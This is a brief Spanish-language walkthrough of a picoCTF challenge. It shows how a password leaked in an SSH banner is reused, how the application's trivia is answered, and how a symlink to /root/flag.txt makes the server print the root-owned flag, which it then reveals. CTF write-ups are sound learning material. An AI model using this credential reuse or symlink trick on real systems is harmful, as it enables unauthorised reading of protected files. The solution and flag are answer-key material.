## Descripción
Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 55928`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 61884`. From the above information abuse the machine and find the flag in the /root directory.
## Pistas
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing
## Solución 1
1. Usando las pistas dadas por el otro servidor
```
Password: SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
2. Contestando las preguntas dadas por la aplicación
```
what is the password? 

My_Passw@rd_@1234

What is the top cyber security conference in the world?

RSA

Lol, good try, try again and good luck

What is the top cyber security conference in the world?

RSA Conference

Lol, good try, try again and good luck

What is the top cyber security conference in the world?

DEFCON

the first hacker ever was known for phreaking(making free phone calls), who was it?

JOHN DRAPER
```
3. Vemos que se trata de una consola, por lo que vemos el contenido.
4. Vemos que hay un archivo llamado `banner`, podemos buscar la bandera en `root/flag.txt`
5. Como no se puede acceder, hacemos un enlace simbolico al archivo banner, para que se muestre al ingresar
`ln -s /root/flag.txt /home/player/banner`
6. Volvemos a ingresar al servidor
```bash
nc tethys.picoctf.net 61884

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```
## Notas adicionales

## Referencias
